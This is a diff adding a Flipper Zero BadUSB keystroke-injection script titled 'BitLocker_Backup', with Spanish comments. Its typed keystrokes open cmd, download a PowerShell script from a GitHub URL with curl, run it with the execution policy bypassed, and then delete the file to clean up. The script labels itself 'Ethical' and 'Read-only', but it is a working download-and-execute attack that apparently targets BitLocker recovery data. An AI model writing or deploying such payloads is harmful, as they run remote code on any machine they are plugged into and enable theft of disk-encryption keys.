@@ -1,0 +1,29 @@
+REM =========================================
+REM 003 
+REM BitLocker_Backup - Flipper Zero
+REM Download -> Execute -> Cleanup
+REM Read-only | Ethical | CyberRedPanda
+REM =========================================
+
+ID US
+DELAY 1000
+
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 800
+
+REM --- Descargar script desde GitHub ---
+STRING curl.exe -L https://raw.githubusercontent.com/hacker-Cabronico/Flipper_Zero/main/003-BitLocker_Backup/003-BitLocker_Backup.ps1 -o "%USERPROFILE%\CyberRedPanda003.ps1"
+ENTER
+DELAY 3000
+
+REM --- Ejecutar script ---
+STRING powershell -NoProfile -ExecutionPolicy Bypass -File "%USERPROFILE%\CyberRedPanda003.ps1"
+ENTER
+DELAY 5000
+
+REM --- Limpiar ---
+STRING del "%USERPROFILE%\CyberRedPanda003.ps1"
+ENTER
